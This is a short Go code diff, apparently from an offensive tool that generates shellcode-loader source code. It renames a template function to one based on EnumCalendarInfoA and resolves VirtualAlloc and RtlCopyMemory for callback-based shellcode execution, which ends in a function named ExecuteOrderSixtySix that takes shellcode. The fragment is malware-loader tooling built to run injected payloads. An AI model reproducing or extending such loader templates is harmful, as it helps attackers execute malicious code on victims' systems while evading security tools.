@@ -4,10 +4,9 @@ import (
 	"fmt"
 )
 
-func GetCallbackTemplate(targetProcess string) string {
-	var _ = targetProcess // unused in this template
+func GetEnumCalendarInfoATemplate(targetProcess string) string {
+	InformProcessUnused(targetProcess)
 
-	println("\n\n[!] PLEASE NOTE: shellcode will not be injected into new process with this method")
 	return fmt.Sprintf(`
 package main
 
@@ -27,12 +26,12 @@ var (
 	ntdll           = syscall.MustLoadDLL("ntdll.dll")
 
 	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
-	EnumCalendarInfoA        = kernel32.MustFindProc("EnumCalendarInfoA")
-	RtlCopyMemory   = ntdll.MustFindProc("RtlCopyMemory")
+	EnumCalendarInfoA   = kernel32.MustFindProc("EnumCalendarInfoA")
+	RtlCopyMemory       = ntdll.MustFindProc("RtlCopyMemory")
 
 	LOCALE_USER_DEFAULT = 0x0400
-	ENUM_ALL_CALENDARS = 0xFFFFFFFF
-	CAL_SMONTHNAME1 = 0x00000015
+	ENUM_ALL_CALENDARS  = 0xFFFFFFFF
+	CAL_SMONTHNAME1     = 0x00000015
 )
 
 func ExecuteOrderSixtySix(shellcode []byte) {
